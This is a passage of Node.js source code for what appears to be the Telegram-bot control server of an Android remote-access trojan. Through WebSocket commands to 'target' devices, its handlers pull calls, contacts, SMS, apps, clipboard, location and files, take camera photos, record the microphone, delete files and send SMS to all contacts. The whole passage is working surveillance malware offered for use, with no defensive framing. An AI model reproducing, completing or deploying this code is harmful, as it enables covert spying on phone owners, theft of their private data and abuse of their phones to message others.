                        {text: '𝐌𝐚𝐢𝐧 𝐜𝐚𝐦𝐞𝐫𝐚', callback_data: `camera_main:${uuid}`},
                        {text: '𝐒𝐞𝐥𝐟𝐢𝐞 𝐜𝐚𝐦𝐞𝐫𝐚', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧', callback_data: `location:${uuid}`},
                        {text: '𝐓𝐨𝐚𝐬𝐭', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '𝐂𝐚𝐥𝐥𝐬', callback_data: `calls:${uuid}`},
                        {text: '𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '𝐕𝐢𝐛𝐚𝐫𝐚𝐭𝐞', callback_data: `vibrate:${uuid}`},
                        {text: '𝐒𝐡𝐨𝐰 𝐧𝐨𝐭𝐢𝐟𝐚𝐜𝐢𝐨𝐧', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝐌𝐞𝐬𝐬𝐚𝐠𝐞𝐬', callback_data: `messages:${uuid}`},
                        {text: '𝐒𝐞𝐧𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝐏𝐥𝐚𝐲 𝐚𝐮𝐝𝐢𝐨', callback_data: `play_audio:${uuid}`},
                        {text: '𝐒𝐭𝐨𝐩 𝐚𝐮𝐝𝐢𝐨', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝐒𝐞𝐧𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐚𝐥𝐥 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐬',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°•  𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐚𝐲
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝 𝐒𝐨𝐨𝐧....\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝐂𝐨𝐧𝐧𝐞𝐜𝐞𝐭𝐞𝐝 𝐝𝐞𝐯𝐢𝐜𝐞𝐬"], ["𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
